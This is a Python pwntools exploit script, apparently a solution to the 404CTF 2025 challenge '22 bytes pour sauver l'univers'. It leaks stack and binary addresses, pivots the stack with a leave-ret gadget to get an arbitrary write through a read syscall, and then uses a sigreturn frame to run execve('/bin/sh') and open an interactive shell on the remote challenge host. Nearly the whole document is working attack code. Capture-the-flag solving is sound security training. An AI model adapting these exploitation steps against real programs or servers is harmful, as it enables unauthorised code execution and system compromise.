#!/usr/bin/env python3

# Author: Pwnsard
# Challenge: 22 bytes pour sauver l'univers
# CTF: 404CTF 2025

from pwn import *

exe = ELF("./data/chall")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("challenges.404ctf.fr", 32468)

    return r


def main():
    r = conn()

    print("[*] Leaking phase")
    payload = b"A" * 31
    r.recvuntil(b">> ")
    r.sendline(payload)
    leak = r.recvuntil(b"Mais").split(b'\n')
    stack_leak_addr = int.from_bytes(leak[2], "little")
    print(f"stack leak : {hex(stack_leak_addr)}")

    payload = b"A" * 39
    r.recvuntil(b">> ")
    r.sendline(payload)
    leak = r.recvuntil(b"Mais").split(b'\n')
    exe.address = int.from_bytes(leak[2], "little") - 0x443
    print(f".text@{hex(exe.address)}")

    print("[*] Setup ROPchain")
    rop = ROP(exe)
    leave_ret_gadget = rop.find_gadget(["leave", "ret"])[0]
    pop_rbp_gadget = rop.find_gadget(["pop rbp", "ret"])[0]
    spoofed_stack_pointer = stack_leak_addr - 0x30
    arbitrary_write_addr = stack_leak_addr - 0x20

    payload = p64(stack_leak_addr - 0x10)  # This points to "spoofed_stack_pointer", allows an arbitrary read
    payload += p64(exe.address + 0x377)    # This points to the read syscall inside of the program. Because rbp has been spoofed, the syscall will use the rest of the payload as arguments
    payload += p64(arbitrary_write_addr)   # arbitrary_write_addr in rsi
    payload += b"\x00\xff\x00\x00"         # 0xff00 in rdx (count for read)
    payload += b"\x00\x00\x00\x00"         # 0 in rdi      (stdin file descriptor)

    payload += p64(spoofed_stack_pointer)  # Stack pivot, this address points to the origin of the payload
    payload += p64(leave_ret_gadget)[:-2]  # First executed gadget, allows for a stack pivot to the origin of the payload
    r.recvuntil(b">> ")
    print("[*] Getting arbitrary write")
    print(payload)
    print(hex(leave_ret_gadget))
    r.send(payload)

    # Now we have an arbitrary write
    syscall_address = exe.address + 0x386
    read_address = exe.address + 0x381

    sigreturn_frame = SigreturnFrame()
    sigreturn_frame.rax = 0x3b
    sigreturn_frame.rip = syscall_address
    sigreturn_frame.rdi = stack_leak_addr + 0xf8 # points to /bin/sh

    print("[*] Setup a sigreturn frame")
    payload = b"B" * 8 + p64(read_address) + b"D" * 0x8 + p64(syscall_address) + bytes(sigreturn_frame) + b"/bin/sh\x00"
    r.sendline(payload)

    payload = b"C" * 0xe
    input("Enter any key to get your shell : ") # If we don't give pwntools a break it panics
    r.sendline(payload)

    print("[*] Enjoy your shell !")

    r.interactive()


if __name__ == "__main__":
    main()
